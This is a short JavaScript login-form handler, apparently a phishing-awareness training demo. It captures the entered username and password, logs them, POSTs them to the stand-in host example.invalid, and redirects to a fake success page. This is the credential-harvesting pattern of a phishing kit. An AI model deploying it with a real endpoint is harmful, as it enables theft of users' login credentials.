const form = document.getElementById('loginForm');

form.addEventListener('submit', async (e) => {
  e.preventDefault();

  const username = document.getElementById('username').value;
  const password = document.getElementById('password').value;

  // Training-only fake payload
  const payload = {
    username,
    password,
    training: true
  };

  // SAFE DEMO:
  // Instead of sending to a real server,
  // we only log the payload locally.
  console.log('Demo POST payload:', payload);

  // OPTIONAL EDUCATIONAL EXAMPLE:
  // This intentionally points to a non-routable example domain.
  // It demonstrates where a suspicious request WOULD appear
  // in the browser Network tab without transmitting data.

  try {
    await fetch('https://example.invalid/fake-login-endpoint', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(payload)
    });
  } catch (err) {
    console.log('Expected demo error:', err.message);
  }

  // Redirect to success page
  window.location.href = 'success.html';
});